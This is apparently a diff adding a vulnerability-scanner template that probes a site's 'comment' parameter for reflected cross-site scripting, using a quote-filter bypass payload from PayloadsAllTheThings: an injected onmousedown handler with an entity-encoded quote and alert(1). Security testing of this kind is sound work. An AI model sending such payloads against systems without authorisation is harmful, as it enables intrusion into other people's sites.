@@ -1,0 +1,20 @@
+id: patt-xss-mousedown-01-comment
+name: 'PATT xss patt-xss-mousedown-01 via comment'
+severity: medium
+type: active
+tags:
+  - xss
+  - patt
+  - filterquote
+description: 'PATT Bypass Quotes in Mousedown Event: &#39; as quote. [patt:patt-xss-mousedown-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      comment:
+        - '" onmousedown="var name = ''&#39;;nxp0020//''; alert(1)'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nxp0020'
